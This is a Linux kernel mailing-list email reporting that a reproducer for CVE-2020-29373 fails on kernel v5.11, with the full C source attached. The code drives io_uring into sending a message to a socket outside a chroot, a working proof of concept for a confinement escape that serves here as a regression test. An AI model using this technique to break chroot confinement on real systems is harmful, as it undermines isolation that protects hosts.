Return-Path: <io-uring-owner@vger.kernel.org>
X-Original-To: lists+io-uring@lfdr.de
Delivered-To: lists+io-uring@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 4AE9F316FB0
	for <lists+io-uring@lfdr.de>; Wed, 10 Feb 2021 20:09:43 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S233664AbhBJTJY (ORCPT <rfc822;lists+io-uring@lfdr.de>);
        Wed, 10 Feb 2021 14:09:24 -0500
Received: from mx2.suse.de ([195.135.220.15]:55746 "EHLO mx2.suse.de"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
        id S234466AbhBJTJP (ORCPT <rfc822;io-uring@vger.kernel.org>);
        Wed, 10 Feb 2021 14:09:15 -0500
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Received: from relay2.suse.de (unknown [195.135.221.27])
        by mx2.suse.de (Postfix) with ESMTP id 6DC3CACB7;
        Wed, 10 Feb 2021 19:08:33 +0000 (UTC)
Date:   Wed, 10 Feb 2021 20:08:31 +0100
From:   Petr Vorel <pvorel@suse.cz>
To:     io-uring@vger.kernel.org
Cc:     Jens Axboe <axboe@kernel.dk>, Nicolai Stange <nstange@suse.de>,
        Martin Doucha <mdoucha@suse.cz>,
        Pavel Begunkov <asml.silence@gmail.com>,
        Bjorn Andersson <bjorn.andersson@linaro.org>,
        ltp@lists.linux.it
Subject: CVE-2020-29373 reproducer fails on v5.11
Message-ID: <YCQvL8/DMNVLLuuf@pevik>
Reply-To: Petr Vorel <pvorel@suse.cz>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Precedence: bulk
List-ID: <io-uring.vger.kernel.org>
X-Mailing-List: io-uring@vger.kernel.org

Hi all,

I found that the reproducer for CVE-2020-29373 from Nicolai Stange (source attached),
which was backported to LTP as io_uring02 by Martin Doucha [1] is failing since
10cad2c40dcb ("io_uring: don't take fs for recvmsg/sendmsg") from v5.11-rc1.

io_uring02 failure:
io_uring02.c:148: TFAIL: Write outside chroot succeeded.

The original reproducer (exits with 4) failure:
error: cqe 255: res=16, but expected -ENOENT
error: Test failed

Quoting Nicolai: This is likely to be a real issue with the kernel commit.
The test tries to do a sendmsg() to an AF_UNIX socket outside
a chroot. So the res=16 indicates that it was able to look it up and send 16
bytes to it.

Then 907d1df30a51 ("io_uring: fix wqe->lock/completion_lock deadlock") from v5.11-rc6 causes
different errors errors:
io_uring02.c:161: TFAIL: Write outside chroot result not found
io_uring02.c:164: TFAIL: Wrong number of entries in completion queue

According to Nicolai this could be a test bug (test tries to race io_uring into
processing the sendmsg request asynchronously from a worker thread (where is
the vulnerability). That was is a needed workaround due missing IOSQE_ASYNC on
older kernels (< 5.5).

Tips and comments are welcome.

Kind regards,
Petr

[1] https://github.com/linux-test-project/ltp/tree/master/testcases/kernel/syscalls/io_uring/io_uring02.c

/*
 * repro-CVE-2020-29373 -- Reproducer for CVE-2020-29373.
 *
 * Copyright (c) 2021 SUSE
 * Author: Nicolai Stange <nstange@suse.de>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <syscall.h>
#include <linux/io_uring.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <errno.h>
#include <inttypes.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>

static int io_uring_setup(__u32 entries, struct io_uring_params * p)
{
	return (int)syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(unsigned int fd, __u32 to_submit,
			  __u32 min_complete, unsigned int flags ,
			  sigset_t * sig, size_t sigsz)
{
	return (int)syscall(__NR_io_uring_enter, fd, to_submit,
			    min_complete, flags, sig, sigsz);
}

/*
 * This attempts to make the kernel issue a sendmsg() to
 * path from io_uring's async io_sq_wq_submit_work().
 *
 * Unfortunately, IOSQE_ASYNC is available only from kernel version
 * 5.6 onwards. To still force io_uring to process the request
 * asynchronously from io_sq_wq_submit_work(), queue a couple of
 * auxiliary requests all failing with EAGAIN before. This is
 * implemented by writing repeatedly to an auxiliary O_NONBLOCK
 * AF_UNIX socketpair with a small SO_SNDBUF.
 */
static int try_sendmsg_async(const char * const path)
{
	int r, i, j;

	int aux_sock[2];
	int snd_sock;
	int sockoptval;
	char sbuf[16] = { 0 };
	struct iovec siov = { .iov_base = &sbuf, .iov_len = sizeof(sbuf) };
	struct msghdr aux_msg = {
		.msg_name = NULL,
		.msg_namelen = 0,
		.msg_iov = &siov,
		.msg_iovlen = 1,
	};
	struct sockaddr_un addr = { 0 };
	struct msghdr msg = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &siov,
		.msg_iovlen = 1,
	};

	struct io_uring_params iour_params = { 0 };
	int iour_fd;
	void *iour_sqr_base;
	__u32 *iour_sqr_phead;
	__u32 *iour_sqr_ptail;
	__u32 *iour_sqr_pmask;
	__u32 *iour_sqr_parray;
	struct io_uring_sqe *iour_sqes;
	struct io_uring_sqe *iour_sqe;
	void *iour_cqr_base;
	__u32 *iour_cqr_phead;
	__u32 *iour_cqr_ptail;
	__u32 *iour_cqr_pmask;
	struct io_uring_cqe *iour_cqr_pcqes;
	__u32 iour_sqr_tail;
	__u32 iour_cqr_tail;
	__u32 n_cqes_seen;

	r = socketpair(AF_UNIX, SOCK_DGRAM, 0, aux_sock);
	if (r < 0) {
		perror("socketpair()");
		return 1;
	}

	sockoptval = 32 + sizeof(sbuf);
	r = setsockopt(aux_sock[1], SOL_SOCKET, SO_SNDBUF, &sockoptval,
		       sizeof(sockoptval));
	if (r < 0) {
		perror("setsockopt(SO_SNDBUF)");
		goto close_aux_sock;
	}

	r = fcntl(aux_sock[1], F_SETFL, O_NONBLOCK);
	if (r < 0) {
		perror("fcntl(F_SETFL, O_NONBLOCK)");
		goto close_aux_sock;
	}

	snd_sock = socket(AF_UNIX, SOCK_DGRAM, 0);
	if (snd_sock < 0) {
		perror("socket(AF_UNIX)");
		r = -1;
		goto close_aux_sock;
	}

	addr.sun_family = AF_UNIX;
	strcpy(addr.sun_path, path);

	iour_fd = io_uring_setup(512, &iour_params);
	if (iour_fd < 0) {
		perror("io_uring_setup()");
		r = -1;
		goto close_socks;
	}

	iour_sqr_base = mmap(NULL,
			     (iour_params.sq_off.array +
			      iour_params.sq_entries * sizeof(__u32)),
			     PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
			     iour_fd, IORING_OFF_SQ_RING);
	if (iour_sqr_base == MAP_FAILED) {
		perror("mmap(IORING_OFF_SQ_RING)");
		r = -1;
		goto close_iour;
	}

	iour_sqr_phead = iour_sqr_base + iour_params.sq_off.head;
	iour_sqr_ptail = iour_sqr_base + iour_params.sq_off.tail;
	iour_sqr_pmask = iour_sqr_base + iour_params.sq_off.ring_mask;
	iour_sqr_parray = iour_sqr_base + iour_params.sq_off.array;

	iour_sqes = mmap(NULL,
			 iour_params.sq_entries * sizeof(struct io_uring_sqe),
			 PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
			 iour_fd, IORING_OFF_SQES);
	if (iour_sqes == MAP_FAILED) {
		perror("mmap(IORING_OFF_SQES)");
		r = -1;
		goto close_iour;
	}

	iour_cqr_base =
		mmap(NULL,
		     (iour_params.cq_off.cqes +
		      iour_params.cq_entries * sizeof(struct io_uring_cqe)),
		     PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
		     iour_fd, IORING_OFF_CQ_RING);
	if (iour_cqr_base == MAP_FAILED) {
		perror("mmap(IORING_OFF_CQ_RING)");
		r = -1;
		goto close_iour;
	}

	iour_cqr_phead = iour_cqr_base + iour_params.cq_off.head;
	iour_cqr_ptail = iour_cqr_base + iour_params.cq_off.tail;
	iour_cqr_pmask = iour_cqr_base + iour_params.cq_off.ring_mask;
	iour_cqr_pcqes = iour_cqr_base + iour_params.cq_off.cqes;

	/*
	 * First add the auxiliary sqes supposed to fail
	 * with -EAGAIN ...
	 */
	iour_sqr_tail = *iour_sqr_ptail;
	for (i = 0, j = iour_sqr_tail; i < 255; ++i, ++j) {
		iour_sqe = &iour_sqes[i];
		*iour_sqe = (struct io_uring_sqe){0};
		iour_sqe->opcode = IORING_OP_SENDMSG;
		iour_sqe->flags = IOSQE_IO_DRAIN;
		iour_sqe->fd = aux_sock[1];
		iour_sqe->addr = (__u64)&aux_msg;
		iour_sqe->user_data = i;
		iour_sqr_parray[j & *iour_sqr_pmask] = i;
	}

	/*
	 * ... followed by the actual one supposed
	 * to fail with -ENOENT.
	 */
	iour_sqe = &iour_sqes[255];
	*iour_sqe = (struct io_uring_sqe){0};
	iour_sqe->opcode = IORING_OP_SENDMSG;
	iour_sqe->flags = IOSQE_IO_DRAIN;
	iour_sqe->fd = snd_sock;
	iour_sqe->addr = (__u64)&msg;
	iour_sqe->user_data = 255;
	iour_sqr_parray[j & *iour_sqr_pmask] = 255;

	iour_sqr_tail += 256;
	__atomic_store(iour_sqr_ptail, &iour_sqr_tail, __ATOMIC_RELEASE);

	r = io_uring_enter(iour_fd, 256, 256, IORING_ENTER_GETEVENTS, NULL, 0);
	if (r < 0) {
		perror("io_uring_enter");
		goto close_iour;
	}

	if (r != 256) {
		fprintf(stderr,
			"error: io_uring_enter(): unexpected return value\n");
		r = 1;
		goto close_iour;
	}

	r = 0;
	n_cqes_seen = 0;
	__atomic_load(iour_cqr_ptail, &iour_cqr_tail, __ATOMIC_ACQUIRE);
	for(i = *iour_cqr_phead; i != iour_cqr_tail; ++i) {
		const struct io_uring_cqe *cqe;

		cqe = &iour_cqr_pcqes[i & *iour_cqr_pmask];
		++n_cqes_seen;

		if (cqe->user_data != 255) {
			if (cqe->res < 0 && cqe->res != -EAGAIN) {
				r = r < 2 ? 2 : r;
				fprintf(stderr,
					"error: cqe %" PRIu64 ": res=%" PRId32 "\n",
					cqe->user_data, cqe->res);
			}
		} else if (cqe->res != -ENOENT) {
			r = 3;
			fprintf(stderr,
				"error: cqe %" PRIu64 ": res=%" PRId32 ", but expected -ENOENT\n",
				cqe->user_data, cqe->res);
		}
	}
	__atomic_store(iour_cqr_ptail, &iour_cqr_tail, __ATOMIC_RELEASE);

	if (n_cqes_seen != 256) {
		fprintf(stderr, "error: unexpected number of io_uring cqes\n");
		r = 4;
	}

close_iour:
	close(iour_fd);
close_socks:
	close(snd_sock);
close_aux_sock:
	close(aux_sock[0]);
	close(aux_sock[1]);

	return r;
}


int main(int argc, char *argv[])
{
	int r;
	char tmpdir[] = "/tmp/tmp.XXXXXX";
	int rcv_sock;
	struct sockaddr_un addr = { 0 };
	pid_t c;
	int wstatus;

	if (!mkdtemp(tmpdir)) {
		perror("mkdtemp()");
		return 1;
	}

	rcv_sock = socket(AF_UNIX, SOCK_DGRAM, 0);
	if (rcv_sock < 0) {
		perror("socket(AF_UNIX)");
		r = 1;
		goto rmtmpdir;
	}

	addr.sun_family = AF_UNIX;
	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/sock", tmpdir);

	r = bind(rcv_sock, (struct sockaddr *)&addr,
		 sizeof(addr));
	if (r < 0) {
		perror("bind()");
		close(rcv_sock);
		r = 1;
		goto rmtmpdir;
	}

	c = fork();
	if (!c) {
		close(rcv_sock);

		if (chroot(tmpdir)) {
			perror("chroot()");
			return 1;
		}

		r = try_sendmsg_async(addr.sun_path);
		if (r < 0) {
			/* system call failure */
			r = 1;
		} else if (r) {
			/* test case failure */
			r += 1;
		}

		return r;
	}

	if (waitpid(c, &wstatus, 0) == (pid_t)-1) {
		perror("waitpid()");
		r = 1;
		goto rmsock;
	}

	if (!WIFEXITED(wstatus)) {
		fprintf(stderr, "child got terminated\n");
		r = 1;
		goto rmsock;
	}

	r = WEXITSTATUS(wstatus);
	if (r > 1)
		fprintf(stderr, "error: Test failed\n");

rmsock:
	close(rcv_sock);
	unlink(addr.sun_path);

rmtmpdir:
	rmdir(tmpdir);

	return r;
}
